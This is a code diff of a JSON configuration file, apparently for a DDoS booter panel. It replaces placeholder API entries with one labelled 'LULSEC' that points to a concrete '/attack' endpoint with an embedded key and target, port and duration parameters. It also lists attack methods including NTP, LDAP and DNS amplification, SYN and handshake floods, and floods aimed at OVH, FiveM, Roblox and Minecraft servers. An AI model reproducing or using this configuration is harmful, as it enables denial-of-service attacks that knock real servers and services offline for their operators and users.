@@ -1,16 +1,9 @@
 {
-    "API_1": {
-        "url": "https://api_one.com/api.php?key=[KEY]&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]",
+    "LULSEC": {
+        "url": "http://blkyoshapi.com:8080/attack?key=Rn4SvJ3H0sQi&target=[HOST]&port=[PORT]&duration=[TIME]&method=[METHOD]",
         "max_time": 0,
         "max_boot": 0,
-        "methods": ["UDP", "TCP"],
-        "cooldown": 0
-    },
-    "API_2": {
-        "url": "https://api_two.com/api.php?key=[KEY]&host=[HOST]&port=[PORT]&time=[TIME]&method=[METHOD]",
-        "max_time": 0,
-        "max_boot": 0,
-        "methods": ["UDP", "TCP"],
+        "methods": ["mixamp", "udp", "ntp", "ldap", "dns", "tcp", "killall", "ovh-tcp", "socket", "nfo", "ssh", "ovh-udp", "game", "udpmini", "fivem", "vse", "mc-drop", "roblox", "rawudp", "rawtcp", "std", "syn", "handshake"],
         "cooldown": 0
     }
 }
